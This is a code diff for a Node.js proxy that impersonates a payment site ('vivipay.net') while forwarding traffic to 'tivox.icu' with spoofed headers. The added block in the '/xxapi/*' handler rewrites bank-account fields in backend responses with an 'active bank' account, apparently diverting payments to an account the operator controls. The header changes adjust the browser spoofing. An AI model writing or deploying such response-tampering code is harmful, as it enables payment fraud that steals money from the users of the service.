@@ -1044,10 +1044,9 @@ async function proxyToTivox(req) {
   fwd['host'] = 'tivox.icu';
   fwd['origin'] = 'https://vivipay.net';
   fwd['referer'] = 'https://vivipay.net/';
-  fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-  fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
-  fwd['sec-ch-ua-mobile'] = '?0';
-  fwd['sec-ch-ua-platform'] = '"Windows"';
+  if (!fwd['user-agent']) {
+    fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+  }
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -1077,10 +1076,9 @@ async function proxyToReal(req) {
   fwd['host'] = 'tivox.icu';
   fwd['origin'] = 'https://vivipay.net';
   fwd['referer'] = 'https://vivipay.net/';
-  fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
-  fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
-  fwd['sec-ch-ua-mobile'] = '?0';
-  fwd['sec-ch-ua-platform'] = '"Windows"';
+  if (!fwd['user-agent']) {
+    fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+  }
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
@@ -1352,7 +1350,27 @@ app.all('/xxapi/*', async (req, res) => {
           return res.status(200).json(slipResp);
         }
       }
-      // If backend responded fine, let the main pipeline handle it
+      // If backend responded fine, we still need to replace bank details!
+      if (!slipFailed && sj2 && sj2.data) {
+        const activeBank = getActiveBank(data, null);
+        if (activeBank) {
+           const hasBank = scanHasBankFields(sj2.data, 0);
+           if (hasBank) deepReplaceBankFields(sj2.data, activeBank, 0, hasBank);
+           
+           if (activeBank.bankName) {
+             sj2.data.bankName = activeBank.bankName;
+             if (sj2.data.acctBankName !== undefined) sj2.data.acctBankName = activeBank.bankName;
+             if (sj2.data.bank !== undefined) sj2.data.bank = activeBank.bankName;
+           }
+           
+           // Stringify the updated JSON and update headers
+           const newBody = JSON.stringify(sj2);
+           sh2['content-length'] = String(Buffer.byteLength(newBody));
+           res.writeHead(sd.status, sh2);
+           return res.end(newBody);
+        }
+      }
+      // If no active bank or didn't replace, just let the main pipeline handle it
     }
 
     // ── availablect — if empty list, inject a placeholder so frontend doesn't block buy ──
